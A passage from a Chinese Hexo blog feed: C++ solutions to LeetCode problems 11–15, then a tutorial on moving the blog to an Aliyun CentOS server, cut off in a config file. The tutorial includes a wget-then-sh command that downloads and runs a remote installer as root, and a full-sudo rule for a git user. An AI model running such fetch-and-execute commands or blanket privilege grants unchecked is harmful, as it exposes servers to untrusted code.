盛最多水的容器</a></h2><p>这道题没找到合适的算法可以解决orz，暴力遍历时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，看了大佬的题解可以用单调栈+二分达到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mo><mi>log</mi><mo>⁡</mo></mo><mrow></mrow></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log_{}{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.24414em;"><span style="top:-1.75586em;margin-right:0.05em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span><span class="mclose">)</span></span></span></span>。（<s>还不会以后补过</s>）</p><p>不妨从数学角度理解(贪心)，找到盛水容器的最优解，先说结论，利用双指针扫描数组，<code>i</code>、<code>j</code>分别指向数组的首尾，若左边界的高度大于右边界，则<code>j--</code>，反之则<code>i++</code>，直到两指针相遇，每次迭代更新最大值，即可找到最优解，时间复杂度可优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>（思路较为巧妙，建议背过）</p><p>难点在于证明该做法的正误：在指针逼近的过程中，必定出现一边指针先到达最优解边界的情况，这里假设左边界先到达，此时预期最优解的边界坐标小于当前右指针<code>j</code>。利用反证法，假设左边界高度小于等于右边界高度，预期解的容水量必定小于当前，矛盾，故左边界的高度大于右边界，右指针左移，必定能得到最优解</p><p><img src="https://s2.loli.net/2023/10/25/6sUNRwkKp3c8fuy.png" alt="证明"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;<span class="comment">//保存最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=height.<span class="built_in">size</span>()<span class="number">-1</span>;i&lt;j;)<span class="comment">//双指针逼近，直到相遇</span></span><br><span class="line">        &#123;</span><br><span class="line">            res=<span class="built_in">max</span>(<span class="built_in">min</span>(height[i],height[j])*(j-i),res);<span class="comment">//迭代更新</span></span><br><span class="line">            <span class="keyword">if</span>(height[i]&lt;height[j]) i++;</span><br><span class="line">            <span class="keyword">else</span> j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="12-整数转罗马数字"><a href="https://leetcode.cn/problems/integer-to-roman/">12. 整数转罗马数字</a></h2><p>水题，因为数据量仅为1-3999，打表都能过，为了显得不那么业余，浅找一下规律</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt;I    4 -&gt;IV    5 -&gt;V    9 -&gt;IX</span><br><span class="line">10-&gt;X    40-&gt;XL    50-&gt;L    90-&gt;XC</span><br><span class="line">100-&gt;C   400-&gt;CD   500-&gt;D   900-&gt;CM</span><br><span class="line">1000-&gt;M</span><br></pre></td></tr></table></figure><p>记录一下特殊情况，若大于特殊值在后面补<code>I、X、C、M</code>即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">intToRoman</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> values[]=&#123;<span class="comment">//特殊值</span></span><br><span class="line">            <span class="number">1000</span>,</span><br><span class="line">            <span class="number">900</span>,<span class="number">500</span>,<span class="number">400</span>,<span class="number">100</span>,</span><br><span class="line">            <span class="number">90</span>,<span class="number">50</span>,<span class="number">40</span>,<span class="number">10</span>,</span><br><span class="line">            <span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span></span><br><span class="line">        &#125;;</span><br><span class="line">        string str[]=&#123;<span class="comment">//特殊值对应的罗马数字</span></span><br><span class="line">            <span class="string">&quot;M&quot;</span>,</span><br><span class="line">            <span class="string">&quot;CM&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;CD&quot;</span>,<span class="string">&quot;C&quot;</span>,</span><br><span class="line">            <span class="string">&quot;XC&quot;</span>,<span class="string">&quot;L&quot;</span>,<span class="string">&quot;XL&quot;</span>,<span class="string">&quot;X&quot;</span>,</span><br><span class="line">            <span class="string">&quot;IX&quot;</span>,<span class="string">&quot;V&quot;</span>,<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;I&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        string result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(num&gt;=values[i])</span><br><span class="line">            &#123;</span><br><span class="line">                num-=values[i];</span><br><span class="line">                result+=str[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="13-罗马数字转整数"><a href="https://leetcode.cn/problems/roman-to-integer/">13. 罗马数字转整数</a></h2><p>是上一题的逆运算，直接将各罗马数字的值相加即可，注意要特殊判断如果前面的罗马数字代表的值小于后面，要减去前面罗马数字的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; hash;</span><br><span class="line">        hash[<span class="string">&#x27;I&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        hash[<span class="string">&#x27;V&#x27;</span>]=<span class="number">5</span>;</span><br><span class="line">        hash[<span class="string">&#x27;X&#x27;</span>]=<span class="number">10</span>;</span><br><span class="line">        hash[<span class="string">&#x27;L&#x27;</span>]=<span class="number">50</span>;</span><br><span class="line">        hash[<span class="string">&#x27;C&#x27;</span>]=<span class="number">100</span>;</span><br><span class="line">        hash[<span class="string">&#x27;D&#x27;</span>]=<span class="number">500</span>;</span><br><span class="line">        hash[<span class="string">&#x27;M&#x27;</span>]=<span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">1</span>&lt;s.<span class="built_in">size</span>() &amp;&amp; hash[s[i]]&lt;hash[s[i+<span class="number">1</span>]])<span class="comment">//特殊判断</span></span><br><span class="line">                res-=hash[s[i]];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                res+=hash[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="14-最长公共前缀"><a href="https://leetcode.cn/problems/longest-common-prefix/">14. 最长公共前缀</a></h2><p>简单题，就是循环枚举每个字符串的每个字母，直到前缀超过某一字符串的长度或有字母不匹配输出结果即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        string res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!strs.<span class="built_in">size</span>()) <span class="keyword">return</span> res;<span class="comment">//若传入的字符串数组为空,直接返回</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;;i++)&#123;<span class="comment">//遍历每一个字母、</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;=strs[<span class="number">0</span>].<span class="built_in">size</span>()) <span class="keyword">return</span> res;<span class="comment">//前缀超过第一个字符串长度</span></span><br><span class="line">            <span class="type">char</span> ch=strs[<span class="number">0</span>][i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;strs.<span class="built_in">size</span>();j++)&#123;<span class="comment">//遍历每一个字符串</span></span><br><span class="line">                <span class="keyword">if</span>(i&gt;=strs[j].<span class="built_in">size</span>()||ch!=strs[j][i])<span class="comment">//若超过某一字符串长度或字符不匹配</span></span><br><span class="line">                    <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">            res+=ch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="15-三数之和"><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h2><p>双指针算法，要求数组有序所以先排序，假设指针<code>i、j、k</code>指向的值依次增大，枚举<code>i</code>的位置，<code>j、k</code>指针使用双指针算法，暴力遍历时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> ，找到第一个<code>j</code>指针位置和其对应的<code>k</code>指针，使得刚好满足<code>num[i]+num[j]+num[k]&gt;=0</code>，因为有序，<code>j</code>向前遍历，<code>k</code>指针只能向后寻找，将时间复杂度优化为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;&amp;nums[i]==nums[i<span class="number">-1</span>]) <span class="keyword">continue</span>;<span class="comment">//去除重复三元组</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>,k=nums.<span class="built_in">size</span>()<span class="number">-1</span>;j&lt;k;j++)<span class="comment">//枚举i指针位置</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;i+<span class="number">1</span>&amp;&amp;nums[j]==nums[j<span class="number">-1</span>]) <span class="keyword">continue</span>;<span class="comment">//去除重复三元组</span></span><br><span class="line">                <span class="keyword">while</span>(j&lt;k<span class="number">-1</span>&amp;&amp;nums[i]+nums[j]+nums[k<span class="number">-1</span>]&gt;=<span class="number">0</span>) k--;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]+nums[k]==<span class="number">0</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;nums[i],nums[j],nums[k]&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地hexo博客迁移至云服务器教程</title>
      <link href="/2023/09/14/aliyun/"/>
      <url>/2023/09/14/aliyun/</url>
      
        <content type="html"><![CDATA[<h1>迁移本地hexo博客至云服务器</h1><h2 id="序言">序言</h2><p>2023年了，近期终于入手一台云服务器练手，之前一直有将GitHub上的博客迁移到个人服务器的想法，一是为了加快打开速度， 二是为了缩短冗长的域名。因为网上没找到一篇特别详细的教程（有也大都是几年前发表的），就记录以下我迁移站点时踩过的坑。</p><p>虽然之前也搭建过一些靶场，但我本身对服务器配置并不是十分熟悉，每处排错令我困惑不已，但最后还是折腾出来了。这次体验也让我收获不少。作为小白练手是个不错的选择。<s>希望永远有时间和经历折腾</s></p><p>配置准备：<br>1.能在本地顺利运行的hexo博客（网上教程很多）<br>2.一台服务器（我是一核2G）<br>3.一个心仪的域名<br>4.辅助软件（Xshell）</p><blockquote><p>不知道这个网站能存活多久，没申请SSL证书，域名未备案，没搭防火墙可谓是buff拉满，因此仍将保留我的镜像站点以供访问https://byforacle.github.io/B1og/</p></blockquote><p>好好好，在写这篇的时候已经被拿下了，光速出警，令人感慨</p><p><img src="https://s2.loli.net/2023/09/14/7XHG4iKW2nesZUD.png" alt="备案"></p><p><strong>坐标9.18,搞定了域名备案和SSL证书，希望能平稳运行</strong></p><p>接下来就将开始个人站点搭建之旅</p><h2 id="本地部署">本地部署</h2><p>默认你现在已将拥有了一个至少能在本地正常运行的hexo博客，即已经安装了<code>Nodejs</code>、<code>Git</code>、<code>Hexo</code>等环境</p><p>测试方法为打开终端，跳转到你博客的根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>输入以上命令后访问本地的4000端口看到hexo界面即可  <a href="http://localhost:4000/">http://localhost:4000/</a></p><h2 id="服务器登录">服务器登录</h2><blockquote><p>我阿里云服务器的系统为CentOS  7.9 64位</p></blockquote><p>若你的系统为Ubuntu甚至Windows，命令应该有所改变</p><p>我们先用XShell远程连接阿里云服务器，若首次连接，账号密码可在阿里云控制台重置账号密码获取，主机名即公网IP，端口号默认为22，输入刚才得到的账号密码即可  <s>应该不用贴图吧😓</s></p><p>登陆后切换到root账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br></pre></td></tr></table></figure><h2 id="git账户-配置">git账户 配置</h2><p>安装 git</p><p>在终端里输入安装git</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure><p>等待一下就安装好了。中途会出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Is this ok [y/d/N]:</span><br></pre></td></tr></table></figure><p>输入 ： y 回车即可,回显<code>Complete!</code>即为安装成功</p><p>创建 git 账户并添加其权限（为以后实现自动部署到git仓库做准备）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adduser git</span><br><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure><p>使用vim工具编辑<code>/etc/sudoers</code>文件，这里简述一下本文用过的vim操作</p><p>打开文档后按<code>i</code>进入编辑模式，完成后按<code>esc</code>等待底部insert字样消失后输入<code>:wq</code>退出即可</p><p><img src="https://s2.loli.net/2023/09/14/ulxd538LZbnkP1s.png" alt="vim"></p><p>在绿色光标处添加配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git     ALL=(ALL)     ALL</span><br></pre></td></tr></table></figure><p>改回权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure><p>设置git账户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure><p>输入两次密码就设置成功了。注意，linux 下输入密码是不显示 **** 的，你直接输入，输完回车就行了。</p><p>切换至 git 用户，创建 <code>~/.ssh</code> 文件夹和 <code>~/.ssh/authorized_keys</code> 文件，并赋予相应的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br><span class="line">vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>这里需要将本地的ssh公钥复制到authorized_keys文件中，这样可以让物理机无需账号密码即可连接到我们的服务器，若你已经用SSH方法将博客部署到GitHub，可在本地<code>C:\Users\（你的用户名）\.ssh</code>路径下找到<code>id_rsa.pub</code> 文件，复制粘贴其中内容即可</p><p>接着，输入以下命令，赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /home/git/.ssh/authorized_keys</span><br><span class="line">chmod 700 /home/git/.ssh</span><br></pre></td></tr></table></figure><hr><h2 id="中间节点">中间节点</h2><p>到此处为止，可以说已经完成了一半，我们可以检验一下以上的操作有无生效，在<strong>本地</strong>Git终端中测试是否能免密登录，在电脑本地桌面，右键”Git Bash Here”，输入以下命令，其中 SERVER 填写自己的云主机 ip，执行输入 yes 后不用密码说明配置成功了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure><p>回显<code>Welcome to Alibaba Cloud Elastic Compute Service !</code>即为成功</p><hr><h2 id="创建仓库目录及相关配置">创建仓库目录及相关配置</h2><blockquote><p>注意此时创建的目录即为你站点源码存放的位置，而我们后面用到的宝塔运维面板不支持将网站源码放在Linux敏感目录下，建议谨慎选择（或可以和我选择相同目录）</p></blockquote><p>切换到root用户，在www目录下创建repo文件夹作为Git仓库目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br><span class="line">mkdir /www/repo</span><br></pre></td></tr></table></figure><p>赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 755 /www/repo</span><br></pre></td></tr></table></figure><p>接下来创建 hexo 目录作为网站根目录，并赋予权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /www/hexo</span><br><span class="line">chown -R git:git /www/hexo</span><br><span class="line">chmod -R 755 /www/hexo</span><br></pre></td></tr></table></figure><p>接下来创建一个空白的 git 仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /www/repo</span><br><span class="line">git init --bare hexo.git</span><br></pre></td></tr></table></figure><p>创建一个新的 Git 钩子，用于自动部署</p><p>在 <code>/var/repo/hexo.git </code>下，有一个自动生成的 hooks 文件夹。我们需要在里边新建一个新的钩子文件 post-receive。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /www/repo/hexo.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>进入编辑模式，写入以下shell脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">git --work-tree=/www/hexo --git-dir=/www/repo/hexo.git checkout -f</span><br></pre></td></tr></table></figure><p>修改权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /www/repo/hexo.git/hooks/post-receive</span><br><span class="line">chmod +x /www/repo/hexo.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>到这里 Git 仓库已经搭建完毕了。</p><h2 id="配置nginx环境">配置Nginx环境</h2><p>在Linux安装和配置环境一直令人头疼，为了简化操作我们使用宝塔面板</p><p>进入宝塔面板官网找到Linux CentOs版本的下载命令（若你是其他系统，找到相对应的指令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh https://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484bec</span><br></pre></td></tr></table></figure><p>中途输入”y” 回车等待一会就好了。在执行结果最后会出现地址，用户名，密码等。</p><p>在本地浏览器访问地址，即可可视化地操作远程服务器，此时可能会遇到服务器未响应的问题，这是因为阿里云服务器默认不开启8888端口，在控制台配置安全组选项中打开该端口即可。</p><p>进入面板后可一键配置所需环境，选择左边那个套件（包括Mysql、Nginx、Php等等），其实我们只需要Nginx，手动下载也可</p><p>部署完成之后，点击网站，添加站点，填写你的域名，其他的不要改。</p><p><img src="https://s2.loli.net/2023/09/14/bWfIwrCkOgHG1cU.png" alt="bt"></p><p>填写完之后提交，然后点击” 设置” &gt; ” 配置文件”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    # server_name填写你自己的域名，没有的话填ip(域名最好加上3w)</span><br><span class="line">    server_name hjxlog.com;</span><br><span class="line">    index index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">    # 这里root填写自己的网站根目录，修改为/www/hexo</span><br><span class="line">    root /www/hexo;</span><br></pre></td></tr></table></figure><p>保存，然后选择 “设置”-“网站目录”，将网站目录修改成以下，保存。</p><p><img src="https://s2.loli.net/2023/09/14/kuxwBX86sMKTOFo.png" alt="config"></p><p>回到服务器终端，重启宝塔服务，使之生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service bt restart</span><br></pre></td></tr></table></figure><h2 id="本地repo设置">本地repo设置</h2><p>进入<strong>本地</strong>电脑 hexo 博客的根目录，编辑<strong>站点配置文件 _config.yml</strong>，找到 deploy和url，修改成以下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: http://www.baoyf.com/</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br><span class="line">  </span><br><span class="line">  deploy:</span><br><span class="line">  type: &#x27;git&#x27;</span><br><span class="line">  # repo: git@github.com:Byforacle/B1og.git</span><br><span class="line">  # repo: &#x27;https://github.com/Byforacle/B1og.git&#x27;</span><br><span class="line">  